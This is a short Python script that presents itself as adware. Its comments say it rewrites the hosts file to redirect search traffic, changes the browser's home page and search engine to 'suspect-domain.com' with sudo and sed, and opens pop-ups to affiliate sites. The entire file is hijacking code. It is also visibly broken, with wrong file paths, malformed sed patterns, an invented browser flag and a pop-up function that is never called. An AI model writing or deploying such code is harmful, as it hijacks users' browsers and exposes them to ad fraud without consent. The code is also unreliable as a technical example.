
import os
import subprocess
import time

def modify_hosts_file():
    # Modify hosts file to redirect legitimate search traffic to ad-filled domains.
    with open(os.path.expanduser('.hosts'), 'w') as f:
        f.write('0.0.0.0 www.google.com www.suspect-domain.com')

    os.system('sudo cp ~/.hosts ~/etc/hosts && sudo chown root:wheel /etc/hosts && sudo chmod 644 /etc/hosts')
    time.sleep(1)
    os.system('sudo echo "Search results will be redirected to ad-filled domains."')

def change_browser_settings():
    # Changes the browser's 'Home Page' and 'Default Search Engine'
    home_page = 'http://www.suspect-domain.com'
    
    search_engine = 'http://www.suspect-domain.com/search'

    os.system(f'sudo sed -i "s/About Google URL/s/{home_page}/g" /usr/local/Google/chrome/DefaultApps.json')
    os.system(f'sudo sed -i "s/google-url/s/{search_engine}/g" /usr/local/Google/chrome/DefaultApps.json')

    time.sleep(1)
    os.system('sudo echo "Browser settings have been modified."')

def open_pop_up():
    # Spawns background threads that open browser windows to affiliate websites every few minutes
    subprocess.Popen(['google-chrome', '--url', 'http://www.suspect-domain.com'])
    subprocess.Popen(['firefox', '--url', 'http://www.suspect-domain.com'])

    time.sleep(1800)  # Open pop-ups every 30 minutes (1800 seconds)

def main():
    modify_hosts_file()
    change_browser_settings()

if __name__ == '__main__':
    main()

